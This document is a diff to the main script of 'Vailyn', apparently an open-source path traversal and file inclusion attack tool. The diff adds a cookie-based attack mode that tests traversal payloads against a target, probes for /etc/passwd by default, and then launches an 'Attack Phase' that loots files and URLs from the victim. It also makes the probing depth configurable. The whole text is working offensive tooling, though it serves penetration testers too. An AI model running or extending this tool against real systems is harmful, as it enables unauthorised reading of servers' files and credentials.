@@ -32,6 +32,7 @@ from core.methods.tree import *
 from core.variables import *
 from core.methods.query import *
 from core.methods.inpath import *
+from core.methods.cookie import *
 
 import time
 
@@ -73,6 +74,7 @@ def main() -> int:
     foundurls = [""]
     foundpayloads = []
     vlnfile = "/etc/passwd"
+    checkdepth = 8
 
     if opt["loot"]:
         loot = True
@@ -91,6 +93,9 @@ def main() -> int:
 
     if opt["check"]:
         vlnfile = args.check
+
+    if opt["checkdepth"]:
+        checkdepth = args.checkdepth
         
     iter=1
     ndirs=list.copy(sdirs)
@@ -118,9 +123,8 @@ def main() -> int:
         
         starting_time = time.time()
         #test for the vulnerability
-        m = 8
         with Pool(processes=processes) as pool:
-            res = [pool.apply_async(determine_payloads_query, args=(args.victim,victim2,args.param,verbose,m,l,vlnfile,)) for l in paysplit]
+            res = [pool.apply_async(determine_payloads_query, args=(args.victim,victim2,args.param,verbose,checkdepth,l,vlnfile,)) for l in paysplit]
             for i in res:
                 pays = i.get()
                 foundpayloads += pays
@@ -148,6 +152,8 @@ def main() -> int:
                     foundfiles += restuple[0]
                     foundurls += restuple[1]
     elif (args.attack == 2):
+        if not args.victim.endswith("/"):
+            args.victim = args.victim + "/"
         print("{}Vailyn: {}PATH{}".format(color.RC, color.END+color.RB, color.END))
         print("    v" + version)
         time.sleep(0.5)        
@@ -155,9 +161,8 @@ def main() -> int:
         
         starting_time = time.time()
         #test for the vulnerability
-        m = 8
         with Pool(processes=processes) as pool:
-            res = [pool.apply_async(determine_payloads_inpath, args=(args.victim,victim2,args.param,verbose,m,l,vlnfile,)) for l in paysplit]
+            res = [pool.apply_async(determine_payloads_inpath, args=(args.victim,victim2,args.param,verbose,checkdepth,l,vlnfile,)) for l in paysplit]
             for i in res:
                 pays = i.get()
                 foundpayloads += pays
@@ -180,6 +185,47 @@ def main() -> int:
             print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Attack Phase\n'.format(color.RD, color.END))
             with Pool(processes=processes) as pool:
                 res = [pool.apply_async(inpath, args=(args.victim,victim2,args.param,commons,l,depth,verbose,loot,summary,selectedpayloads,)) for l in splitted]
+                for i in res:
+                    restuple = i.get()
+                    foundfiles += restuple[0]
+                    foundurls += restuple[1]
+    elif (args.attack == 3):
+        print("{}Vailyn: {}COOKIE{}".format(color.RC, color.END+color.RB, color.END))
+        print("    v" + version)
+        time.sleep(0.5)
+
+        print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Parsing Cookie\n'.format(color.RD, color.END))
+        cookie, selected = readCookie(args.victim)
+        
+        #print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} init. {2}\n'.format(color.RD, color.END, time.strftime("%I:%M:%S %p")))
+        print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} List Payloads\n'.format(color.RD, color.END))
+        
+        starting_time = time.time()
+        #test for the vulnerability
+        with Pool(processes=processes) as pool:
+            res = [pool.apply_async(determine_payloads_cookie, args=(args.victim,cookie,selected,verbose,checkdepth,l,vlnfile,)) for l in paysplit]
+            for i in res:
+                pays = i.get()
+                foundpayloads += pays
+                
+        ending_time = time.time()
+        vuln_time = ending_time - starting_time
+                
+        attack = False
+        if foundpayloads:
+            attack = True
+            selectedpayloads = select(foundpayloads)
+        else:
+            cont = input("[!] No payload succeeded. Attack anyways? (enter if not) :> ")
+            if cont != "":
+                attack = True
+                selectedpayloads = payloadlist
+        #start the attack
+        starting_time = time.time()
+        if attack:
+            print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Attack Phase\n'.format(color.RD, color.END))
+            with Pool(processes=processes) as pool:
+                res = [pool.apply_async(cookie_attack, args=(args.victim,cookie,selected,commons,l,depth,verbose,loot,summary,selectedpayloads,)) for l in splitted]
                 for i in res:
                     restuple = i.get()
                     foundfiles += restuple[0]
